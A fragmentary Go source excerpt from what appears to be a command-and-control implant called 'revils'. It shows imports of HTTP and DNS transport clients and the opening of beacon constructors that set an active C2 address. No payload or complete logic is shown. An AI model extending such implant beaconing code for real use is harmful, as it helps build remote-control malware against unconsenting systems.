...
import (
	...
	"github.com/Kevin-kitnick/revils/implant/revils/transports/httpclient"
	// {{end}}
	...
	"github.com/Kevin-kitnick/revils/implant/revils/transports/dnsclient"
	// {{end}}
...
func httpBeacon(uri *url.URL) *Beacon {
	...
	var client *httpclient.RevilsHTTPClient
	var err error
...
func dnsBeacon(uri *url.URL) *Beacon {
	var client *dnsclient.RevilsDNSClient
	var err error
	beacon := &Beacon{
		ActiveC2: uri.String(),
		Init: func() error {
